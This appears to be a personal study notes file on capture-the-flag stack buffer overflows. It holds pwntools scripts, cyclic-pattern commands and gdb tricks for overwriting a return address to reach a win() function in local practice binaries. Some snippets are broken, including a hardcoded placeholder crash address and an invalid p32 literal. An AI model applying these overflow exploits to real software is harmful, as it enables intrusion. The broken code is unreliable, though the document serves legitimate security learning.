# TODO
- pwntool
- no script
    - nm ./18 | grep win
    - pwn cyclic 256 | ./18 
    - pwn cyclic -l 0x6161616c
    - python3 -c "from pwn import *; print(b'A'*126 + p32(080491f6))" | ./18
- gdb [jump, set eip] ?

#
break *vuln+53
set $eip = &win
info regis
set $eip = (void *) info address win

(cat vuln.c | grep BUFSIZE | head -n 1 | awk '{print $3}')

python3 find.py $(awk '/BUFSIZE/ {print $3; exit}' 14.c)
pwn cyclic -l 0x$(./14 < pattern | grep -oP '0x\K.+')

pwncyclic
pwn cyclic -l

---
# pwn
```python
from pwn import *
import sys

# Set the architecture (usually 'i386' for 32-bit or 'amd64' for 64-bit)
context.binary = exe = ELF(sys.argv[1])

# --- STEP 1: AUTOMATIC OFFSET DISCOVERY ---
def get_offset():
    # Start a temporary process to find the crash point
    io = process(exe.path)
    
    # Send a large cyclic pattern
    # io.sendline(cyclic(256))
    
    # # Wait for the process to crash
    # io.wait()
    
    # # Read the core dump (the crash state)
    # core = io.corefile
    
    # # Check the Instruction Pointer at the time of the crash
    # # On 32-bit it's 'eip', on 64-bit it's 'rip'
    # fault_address = core.eip 
    fault_address = b'0x12345678'
    # Calculate the offset
    offset = cyclic_find(fault_address)
    log.info(f"Automatically found offset: {offset}")
    return offset

# --- STEP 2: THE ACTUAL EXPLOIT ---
offset = get_offset()
win_addr = exe.symbols['win']

# Build the payload
payload = flat({
    offset: win_addr
})

# Run the real attack
io = process(exe.path)
io.sendline(payload)

# Success!
print(io.recvall().decode())
```
# find_offset
```python
from pwn import *
import sys

filename = "pattern"
# Usage: python3 find_offset.py payload.bin 114
bufsize = int(sys.argv[1])

# Pattern: Fill the buffer, then add a cyclic sequence
# We add extra padding because local variables or saved registers 
# often sit between the buffer and the return address.
payload = b"0" * bufsize + cyclic(100)

with open(filename, "wb") as f:
    f.write(payload)

print(f"pattern generated with bufsize: {bufsize} successfully")
```

pwn cyclic -l 0x6161616c

```python
from pwn import *
import sys
# 1. Setup the binary
elf = ELF(sys.argv[1])
win_addr = elf.symbols['win']  # Automatically finds the address of win()
offset = int(sys.argv[2])                  # Replace with the number you found in GDB

print(f"[*] Found win() at: {hex(win_addr)}")

# 2. Build the payload
# [Padding] + [The Address we want to jump to]
payload = b"A" * offset + p32(win_addr) 

# 3. Fire!
# This starts the process and sends the payload automatically
io = process(sys.argv[1])
io.sendline(payload)
io.interactive() # Keeps the connection open so you can see the flag
```
---

# gdb register
- `set $eip = (void *)0x401256`
- `disassemble vuln`
- `break *vuln+address_offset`

# offset | pattern
### pwn
```python
from pwn import *
# Generate pattern
payload = cyclic(100) 

# Find offset after a crash
offset = cyclic_find(0x6161616c)
print(f"The offset is: {offset}")
```
### GDB + GEF/Pwndbg
- pattern create 100
- pattern search $eip (This automatically finds the offset of the value currently in EIP).
